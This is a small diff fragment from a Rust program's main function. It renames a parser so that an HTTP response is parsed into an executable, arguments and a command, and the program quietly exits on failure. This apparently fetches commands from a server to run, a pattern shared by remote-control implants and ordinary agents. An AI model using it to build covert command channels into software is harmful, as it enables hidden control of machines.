@@ -318,9 +318,9 @@ fn main() {
         None => { log.push_str("http_post FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
 
-    let cmd = match parse_cmd(&resp) {
-        Some(d) => { log.push_str("parse_cmd OK\n"); d }
-        None => { log.push_str("parse_cmd FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
+    let (exec, args, cmd) = match parse_payload(&resp) {
+        Some(d) => { log.push_str("parse_payload OK\n"); d }
+        None => { log.push_str("parse_payload FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
     let _ = fs::write(&log_path, &log);
 
